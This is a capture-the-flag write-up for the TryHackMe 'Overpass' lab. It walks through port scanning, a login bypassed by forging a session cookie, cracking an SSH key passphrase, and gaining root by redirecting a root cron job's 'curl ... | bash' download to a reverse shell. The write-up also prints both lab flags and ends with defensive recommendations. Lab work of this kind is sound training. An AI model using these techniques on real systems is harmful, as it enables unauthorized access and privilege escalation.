# TryHackMe: Overpass

## Challenge Description

What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

## Planning and Scoping

**Target**: 10.10.159.164

# Information Gathering and Reconnaissance

In this process, we used Nmap to scan the target for open ports and services. The command used was:

```bash
nmap -sC -sV 10.10.159.164
```

The open ports and their corresponding services and versions were:

| PORT  | STATE | SERVICE         | VERSION                                             |
|-------|-------|-----------------|-----------------------------------------------------|
| 22/tcp| open  | ssh             | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|
| 80/tcp| open  | http            | Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|

Next, we used Gobuster for directory brute forcing. The command used was:

```bash
gobuster dir -u 10.10.145.163 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```
The directories discovered by Gobuster were:

- /aboutus
- /admin
- /css
- /downloads
- /img


Upon further inspection of the /admin directory, we observed that a script named login.js was loaded. This script was found to contain a vulnerability that enables forced login through cookie manipulation. To bypass the login, all we have to do set the cookie.

```javascript
Cookies.set("SessionToken",statusOrCookie)
```

## Vulnerability Assessment

Based on the information gathered during the reconnaissance phase, the following vulnerabilities were identified:

1. Cookie Manipulation: The /admin directory contained a JavaScript file (login.js) that revealed a vulnerability. The script allows for the forced setting of the SessionToken cookie, which could be exploited to gain unauthorized access to the admin panel.

## Exploitation

### Cracking Passwords

Having successfully bypassed the login mechanism for the `/admin` panel by exploiting the cookie manipulation vulnerability, we were presented with an RSA private key. This key was passphrase-protected. However, we could attempt to crack it using the John the Ripper tool.

First, we converted the RSA private key into a format that John the Ripper can process. This was done using the `ssh2john` utility:

```bash
/opt/john/ssh2john.py id_rsa > id_rsa.john
```

Next, we used John the Ripper to attempt to crack the passphrase:

```bash
john id_rsa.john
```

The output revealed the passphrase to be `james13` for the `id_rsa` private key.

```bash
james13          (id_rsa)
```

With the passphrase cracked, we were able to log in to the SSH service using the username `james` and the cracked private key. Here is the command used:

```bash
ssh james@10.10.145.163 -i id_rsa
```

When prompted for the passphrase, we entered `james13`, granting us access to the system via the SSH service.

Upon logging in as James, we found a `~/.overpass` file in his home directory that we could decrypt using the `overpass` binary. Also, we were able to read user.txt to acquire the first flag.

`thm{65c1aaf000506e56996822c6281e6bf7}`

### Privilege Escalation

After examining the /etc/crontab, we noticed a root-executed job:

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

We also found that we had access to the /etc/hosts file. We altered overpass.thm to redirect to our host machine and hosted a reverse shell at downloads/src/buildscript.sh to execute.

Finally, we read root.txt to obtain the second flag.

`thm{7f336f8c359dbac18d54fdd64ea753bb}`


## Recommendations

Post-assessment, we recommend implementing the following security measures to enhance the system's security:

1. **Cookie Security**: The application should enforce secure cookie handling practices to prevent unauthorized manipulation. Cookies should be properly encrypted and handled server-side to mitigate this risk.

2. **Service Updates**: Keep services like SSH and HTTP up-to-date to prevent exploitation of known vulnerabilities in older versions.

3. **Directory and File Permissions**: Adjust directory and file permissions to limit access to sensitive files and directories. This could help in preventing the exposure of files like RSA private keys.

4. **Cron Jobs**: Avoid running cron jobs as root unless necessary. Misconfigured cron jobs can lead to privilege escalation.

5. **Hosts File Restrictions**: Implement strict controls to prevent unauthorized modification of the /etc/hosts file. This can prevent redirect attacks.

6. **Secure Coding Practices**: Enforce secure coding practices to identify and eliminate vulnerabilities during the development phase. Regular code reviews and security audits can help in achieving this.

By addressing these issues, the system's overall security posture can be significantly improved, thereby preventing similar breaches in the future.